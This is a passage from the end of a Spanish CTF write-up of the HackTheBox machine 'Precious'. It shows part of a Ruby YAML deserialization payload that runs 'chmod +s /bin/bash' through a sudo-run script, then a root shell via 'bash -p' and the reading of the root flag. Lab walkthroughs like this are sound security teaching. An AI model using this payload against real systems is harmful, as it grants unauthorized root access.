                 socket: <span class="o">!</span>ruby/module <span class="s1">'Kernel'</span>
                 method_id: :system
             git_set: <span class="nb">chmod</span> +s /bin/bash
         method_id: :resolve
</pre></td></tr></tbody></table></code></div></div>
<p>Ejecutamos el comando</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>henry@precious:~<span class="nv">$ </span><span class="nb">sudo </span>ruby /opt/update_dependencies.rb 
henry@precious:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
<span class="nt">-rwsr-sr-x</span> 1 root root 1234376 Mar 27  2022 /bin/bash
henry@precious:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>Ahora podemos lanzarnos la bash como root y leemos la flag de root</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>henry@precious:~<span class="nv">$ </span>bash <span class="nt">-p</span>
bash-5.1# <span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">id
</span>root
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>henry<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>henry<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>henry<span class="o">)</span>
bash-5.1# 
bash-5.1# <span class="nb">cat</span> /root/root.txt 
85<span class="k">****************************</span>f4
bash-5.1# 
</pre></td></tr></tbody></table></code></div></div>
<p>Acabamos de comprometer la máquina, Buena suerte.</p>


</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/hackthebox/'>hackthebox</a>,
      <a href='/categories/machine/'>machine</a>,
      <a href='/categories/writeup/'>writeup</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/linux/"
          class="post-tag no-text-decoration" >linux</a>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >hackthebox</a>
      
      <a href="/tags/writeup/"
          class="post-tag no-text-decoration" >writeup</a>
      
      <a href="/tags/virtual-hosting/"
          class="post-tag no-text-decoration" >virtual hosting</a>
      
      <a href="/tags/command-injection/"
          class="post-tag no-text-decoration" >command injection</a>
      
      <a href="/tags/pdfkit/"
          class="post-tag no-text-decoration" >pdfkit</a>
      
      <a href="/tags/easy/"
          class="post-tag no-text-decoration" >easy</a>
      
      <a href="/tags/virtual-hosting/"
          class="post-tag no-text-decoration" >virtual hosting</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        Esta entrada está licenciada bajo 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         por el autor.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Compartir</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Precious+WriteUp+-+H4ckerLite+%7C+Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fprecious-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Precious+WriteUp+-+H4ckerLite+%7C+Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fprecious-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fprecious-writeup%2F&text=Precious+WriteUp+-+H4ckerLite+%7C+Blog" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copiar enlace"
        data-title-succeed="¡Enlace copiado!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Actualizado recientemente</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/inject-writeup/">Inject WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/shoppy-writeup/">Shoppy WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/ambassador-writeup/">Ambassador WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/precious-writeup/">Precious WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/tty/">Tratamiento de la TTY</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/easy/">easy</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    
      
      <a class="post-tag" href="/tags/virtual-hosting/">virtual hosting</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
    
      
      <a class="post-tag" href="/tags/ansible-playbook/">Ansible playbook</a>
    
      
      <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
    
      
      <a class="post-tag" href="/tags/docker/">docker</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contenido</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Lecturas adicionales</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/photobomb-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1675440000"
    data-df="YYYY-MM-DD"
    >
  2023-02-03
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Photobomb WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path Hijacking

Escaneo NMAP

Antes de empezar les recomie...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/shoppy-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673625600"
    data-df="YYYY-MM-DD"
    >
  2023-01-13
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shoppy WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Les explicaré cómo comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la esc...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/inject-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1678550400"
    data-df="YYYY-MM-DD"
    >
  2023-03-11
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Inject WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Les explicaré cómo compremeter la máquina Inject de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo Directory Transversal, usando dicha vulnerabilidad veremos ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/ambassador-writeup/" class="btn btn-outline-primary"
    prompt="Anterior">
    <p>Ambassador WriteUp</p>
  </a>
  

  
  <a href="/posts/photobomb-writeup/" class="btn btn-outline-primary"
    prompt="Nuevo">
    <p>Photobomb WriteUp</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>



        <!-- The Footer -->

<footer class="row pl-3 pr-3">
  <div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0">
    <div class="footer-left">
      <p class="mb-0">
        © 2023
        <a href="https://twitter.com/mortzelo">H4ckerLite</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Hecho con 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         usando el tema 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
        .

      </p>
    </div>

  </div>

</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/easy/">easy</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    
      
      <a class="post-tag" href="/tags/virtual-hosting/">virtual hosting</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
    
      
      <a class="post-tag" href="/tags/ansible-playbook/">Ansible playbook</a>
    
      
      <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
    
      
      <a class="post-tag" href="/tags/docker/">docker</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Actualizar
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

